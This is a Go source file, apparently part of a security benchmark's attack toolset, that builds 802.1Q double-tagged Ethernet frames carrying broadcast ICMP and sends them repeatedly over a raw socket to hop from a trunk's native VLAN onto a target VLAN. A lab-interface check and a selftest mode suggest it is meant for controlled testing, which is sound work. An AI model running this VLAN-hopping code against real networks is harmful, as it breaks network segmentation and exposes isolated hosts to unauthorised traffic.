package main

import (
	"encoding/binary"
	"fmt"
	"net"
	"os"

	"github.com/rohanpunj/iolbox/tools/secbench-attacks-go/internal/attackcommon"
)

func buildFrame(nativeVLAN, targetVLAN int, srcMAC net.HardwareAddr, srcIP net.IP) ([]byte, error) {
	if len(srcMAC) != 6 {
		return nil, fmt.Errorf("source MAC must contain six octets")
	}
	if nativeVLAN < 0 || nativeVLAN > 0x0fff || targetVLAN < 0 || targetVLAN > 0x0fff {
		return nil, fmt.Errorf("VLAN IDs must be between 0 and 4095")
	}

	frame := make([]byte, 22) // Ethernet + two 802.1Q headers
	copy(frame[0:6], net.HardwareAddr{0xff, 0xff, 0xff, 0xff, 0xff, 0xff})
	copy(frame[6:12], srcMAC)
	binary.BigEndian.PutUint16(frame[12:14], 0x8100)
	binary.BigEndian.PutUint16(frame[14:16], uint16(nativeVLAN))
	// The outer tag points at the inner tag; the inner tag points at IPv4.
	binary.BigEndian.PutUint16(frame[16:18], 0x8100)
	binary.BigEndian.PutUint16(frame[18:20], uint16(targetVLAN))
	binary.BigEndian.PutUint16(frame[20:22], 0x0800)
	ip := attackcommon.BuildIPv4(srcIP, net.IPv4bcast, 1, attackcommon.BuildICMPEcho(0, 0, nil))
	return append(frame, ip...), nil
}

func run() int {
	fs, common := attackcommon.BaseParser("802.1Q double-tagged VLAN hop")
	targetVLAN := fs.Int("target_vlan", 20, "inner (target) VLAN to land traffic on")
	nativeVLAN := fs.Int("native_vlan", 1, "outer tag — must match the trunk's native VLAN")
	if err := fs.Parse(os.Args[1:]); err != nil {
		return 2
	}
	if err := attackcommon.EnforceLabIface(common.Iface); err != nil {
		attackcommon.Status("FATAL", err.Error())
		return 2
	}

	srcMAC := attackcommon.InterfaceMAC(common.Iface)
	srcIP := attackcommon.InterfaceIPv4(common.Iface)
	frame, err := buildFrame(*nativeVLAN, *targetVLAN, srcMAC, srcIP)
	if err != nil {
		attackcommon.Status("FATAL", fmt.Sprintf("VLAN-hop packet build failed: %v", err))
		return 1
	}
	if common.Selftest {
		attackcommon.SelftestOK("vlan_hop", fmt.Sprintf("double-tagged frame len=%d", len(frame)))
		return 0
	}

	sender, err := attackcommon.OpenRawSender(common.Iface)
	if err != nil {
		attackcommon.Status("FATAL", err.Error())
		return 1
	}
	defer sender.Close()

	_, err = attackcommon.RunLoop(common.Count, common.Interval, func(n int) error {
		frame, err := buildFrame(*nativeVLAN, *targetVLAN, srcMAC, srcIP)
		if err != nil {
			return err
		}
		if err := sender.Send(frame); err != nil {
			return fmt.Errorf("send double-tagged frame: %w", err)
		}
		attackcommon.Status("SENT", fmt.Sprintf("double-tag #%d outer=%d inner=%d", n+1, *nativeVLAN, *targetVLAN))
		return nil
	})
	if err != nil {
		attackcommon.Status("FATAL", err.Error())
		return 1
	}
	return 0
}

func main() {
	os.Exit(run())
}
